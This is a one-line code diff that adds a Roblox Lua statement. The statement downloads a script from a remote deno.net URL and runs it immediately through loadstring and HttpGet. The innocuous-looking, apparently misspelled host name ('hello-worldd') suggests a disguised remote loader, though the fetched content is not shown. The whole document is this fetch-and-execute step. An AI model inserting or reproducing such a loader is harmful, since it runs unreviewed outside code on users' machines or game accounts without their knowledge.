@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://examples-hello-worldd.olly1483.deno.net/loader"))()
